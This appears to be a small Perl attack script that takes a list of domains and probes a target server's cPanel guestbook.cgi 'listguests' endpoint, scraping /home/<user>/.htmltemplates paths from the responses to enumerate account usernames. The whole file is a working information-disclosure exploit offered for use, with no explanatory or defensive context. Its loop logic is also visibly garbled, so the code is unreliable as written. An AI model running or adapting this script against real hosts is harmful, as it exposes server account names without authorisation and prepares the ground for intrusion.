#!/usr/bin/perl
# @interestedz
use LWP::Simple;
print "put list of domain :";
$x = <STDIN>;
open (DMS, "<$x");
@DOMS = <DMS>;
close DMS;
foreach my $x (@DOMS) {
chomp $x;
$d = $x;
}
foreach $d(@DOMS){
while($d){
for (substr($d, -1, 1)) {
$_ = '';
$ex = $ARGV[0]."/cgi-sys/guestbook.cgi?action=listguests&user=".$d;
my $content = get $ex;
if($content =~ m{/home/(.*?)/.htmltemplates}g){
print "\tFound ~: $1";
}else{
print "\nFaild : $d\n";
 
}
 }
  } 
   }
